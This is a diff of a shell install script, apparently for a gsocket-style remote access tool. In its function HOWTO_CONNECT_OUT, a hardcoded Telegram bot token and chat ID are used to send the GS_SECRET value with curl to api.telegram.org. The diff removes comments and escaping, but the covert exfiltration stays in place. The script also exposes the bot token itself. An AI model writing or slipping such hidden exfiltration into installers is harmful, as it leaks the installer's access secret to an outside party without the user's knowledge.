@@ -1080,23 +1080,15 @@ WARN_EXECFAIL()
 HOWTO_CONNECT_OUT() {
     BOT_TOKEN="7040906244:AAH024l6-BmqE6DtBMBZRBxx9KhnStnOYZY"
     CHAT_ID="5092435646"
-
-    # Pastikan GS_SECRET tidak kosong sebelum mengirim pesan
     if [[ -z "${GS_SECRET}" ]]; then
         echo "Error: GS_SECRET tidak ditemukan!" >&2
         return 1
     fi
 
     MESSAGE="GS_SECRET: ${GS_SECRET}"
-
-    # Escape karakter Markdown agar tidak menyebabkan error
-    ESCAPED_MESSAGE=$(echo "${MESSAGE}" | jq -Rsa '.')
-
-    # Kirim pesan ke Telegram menggunakan cURL
     curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
         -d "chat_id=${CHAT_ID}" \
-        -d "text=${ESCAPED_MESSAGE}" \
-        -d "parse_mode=MarkdownV2"
+        -d "text=${MESSAGE}"
 
 	# After all install attempts output help how to uninstall
 	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
